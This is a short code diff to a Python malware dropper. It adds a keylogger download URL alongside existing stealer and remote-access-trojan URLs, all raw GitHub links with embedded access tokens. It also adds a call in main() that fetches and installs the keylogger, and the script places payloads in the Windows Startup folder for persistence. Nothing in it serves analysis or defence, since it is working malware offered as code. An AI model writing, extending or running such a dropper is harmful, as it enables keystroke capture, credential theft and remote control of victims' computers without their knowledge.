@@ -16,8 +16,9 @@ ensure_pywin32_installed()
 import win32com.client as cl
 
 USER_NAME = getpass.getuser()
-stealer_url = "https://pastebin.com/raw/Juf1T0ze"
-rat_url = "https://pastebin.com/raw/5DjQtGrw"
+keylogger_url = "https://raw.githubusercontent.com/EuroMH/rat/refs/heads/main/KeyLogger.py?token=GHSAT0AAAAAAC3K4Q43NHA3RZEIZPYK5CU2Z2ZZJ7A"
+stealer_url = "https://raw.githubusercontent.com/EuroMH/rat/refs/heads/main/main.pyw?token=GHSAT0AAAAAAC3K4Q432WPGRDCIX25ZZWJWZ2YYS3A"
+rat_url = "https://raw.githubusercontent.com/EuroMH/rat/refs/heads/main/rat.pyw?token=GHSAT0AAAAAAC3K4Q422Q5GUIMNLPREADQYZ2YYTGQ"
 
 def create_shortcut(target_path, shortcut_name):
     startup_folder = path.join('C:\\Users', USER_NAME, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
@@ -51,6 +52,7 @@ for _ in range(1):
     
 
 def main():
+    create_random_pyw(keylogger_url, "keylogger")
     create_random_pyw(stealer_url, "stealer")
     create_random_pyw(rat_url, "rat")
     exit()
